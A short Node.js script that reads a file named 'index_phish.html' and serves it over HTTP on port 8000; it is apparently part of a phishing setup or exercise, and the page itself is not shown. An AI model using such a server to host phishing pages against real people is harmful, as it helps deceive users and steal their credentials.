var http2 = require('http');
var fs2 = require('fs');

fs2.readFile('./index_phish.html', function(err, html2) {
        if(err) {
                throw err;
        }
        http2.createServer(function(req, res){
                res.write(html2);
                res.end();
        }).listen(8000);
});
